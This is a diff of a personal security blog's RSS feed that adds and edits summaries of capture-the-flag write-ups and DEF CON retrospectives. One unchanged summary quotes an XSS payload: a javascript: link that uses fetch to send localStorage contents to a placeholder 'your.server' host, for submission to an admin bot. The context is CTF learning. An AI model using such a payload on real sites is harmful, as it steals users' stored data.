@@ -7,7 +7,17 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <copyright>CC Attribution-NonCommercial 4.0 International License</copyright>
-    <lastBuildDate>Tue, 21 Feb 2023 15:25:54 -0700</lastBuildDate><atom:link href="https://jamvie.net/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Thu, 31 Aug 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://jamvie.net/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>DEFCON 31: Retrospective</title>
+      <link>https://jamvie.net/posts/2023/08/defcon-31-retrospective/</link>
+      <pubDate>Thu, 31 Aug 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://jamvie.net/posts/2023/08/defcon-31-retrospective/</guid>
+      <description>Beginning Back in October of 2019, I was attending my 3rd/4th? year at UBC, where I tried to play in a beginner-friendly CTF known as &amp;ldquo;CSAW 2019&amp;rdquo; with UBC&amp;rsquo;s team: Maple Bacon. Particularly, I tried out a challenge called Unagi, which, having spent an eternity on, I managed to solve after hours of wrangling with the problem.
+To be completely frank, I solved the challenge after googling &amp;ldquo;XML vulnerability&amp;rdquo; and trying out payloads - really, just, throwing payloads and modifying them to tailor the challenge - until one stuck and I got the flag.</description>
+    </item>
+    
     <item>
       <title>PBCTF 2023 : JAZZY x VIE CHALS</title>
       <link>https://jamvie.net/posts/2023/02/pbctf-2023-jazzy-x-vie-chals/</link>
@@ -37,7 +47,7 @@ TL;DR Hide php in image, making a PHP/image polyglot X-Accel-Header redirection 
       <guid>https://jamvie.net/posts/2022/08/defcon-30-retrospective/</guid>
       <description>Man.
 My team, Maple Bacon, collaborated with CMU&amp;rsquo;s CTF team PPP and Theori.io&amp;rsquo;s CTF team The Duck, forming Maple Mallard Magistrates as a merger to participate in DEF CON finals.
-The Beginning @PlaidCTF, @theori_io (The Duck), and @maplebaconctf are joining forces to play DEFCON as Maple Mallard Magistrates. Some PPP members also play on The Duck &amp;amp; Maple Bacon, so this allows all of us to keep playing on the same team.</description>
+The Beginning Discussions about the merge had occurred earlier in the year - I triangulate it to a month or so before I found myself in Athens, Greece attending ICC. This is important to mention as I heard many people speculate about the existence of MMM and whether or not it was formed as a response to something.</description>
     </item>
     
     <item>
@@ -102,16 +112,6 @@ notes/app.py
 Insert as your payload:
 title: eh link: javascript:fetch(&amp;#39;your.server?fleg=&amp;#39;%2B(window.localStorage.getItem(&amp;#34;flag&amp;#34;))); And report to admin. Careful with the wait times&amp;hellip;
 NOTE: I first-blooded this challenge before certain measures were implemented. There were some issues with FBG throughout the competition that involved the organizers making amendments and introducing a pow to help with the stability of the infrastructure.</description>
-    </item>
-    
-    <item>
-      <title>DEF CON Quals 2021: Getting Gud &#43; threefactooorx</title>
-      <link>https://jamvie.net/posts/2021/04/def-con-quals-2021-getting-gud--threefactooorx/</link>
-      <pubDate>Sun, 11 Apr 2021 00:07:54 -0600</pubDate>
-      
-      <guid>https://jamvie.net/posts/2021/04/def-con-quals-2021-getting-gud--threefactooorx/</guid>
-      <description>AKA - How I spent some time reading custom partially-deobfuscated javascript code and actually used the Chrome debugger for once
-DEF CON - undoubtedly the most notorious, famous and recgonized CTF out there. Even people who don&amp;rsquo;t do hacking know about DEF CON. The qualifiers, an event that took place this last weekend, ran for roughly 2 days and had 1 web challenge - which was more like reversing, but I&amp;rsquo;ll take what I can get.</description>
     </item>
     
   </channel>
